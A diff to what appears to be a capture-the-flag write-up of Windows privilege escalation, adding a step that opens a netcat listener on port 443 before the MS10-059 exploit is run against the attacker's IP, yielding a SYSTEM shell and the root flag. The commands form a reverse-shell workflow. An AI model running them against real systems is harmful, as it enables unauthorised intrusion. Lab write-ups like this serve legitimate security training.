@@ -312,6 +312,11 @@
 		       1 File(s)        784.384 bytes
 		       2 Dir(s)  33.180.422.144 bytes free
 
+// Open a listiner with nc
+	
+	$ sudo rlwrap nc -lvnp 443
+	listening on [any] 443 ...
+	
 // Run ms10-059.exe with IP & PORT
 
 	C:\Users\tolis\Desktop\tmp> ms10-059.exe 10.10.17.8 443
@@ -329,7 +334,7 @@
 	whoami
 	nt authority\system
 
-// We got root flag !
+// And root flag !
 
 	C:\Users\Administrator\Desktop> type root.txt
 	ce65ceee6............................
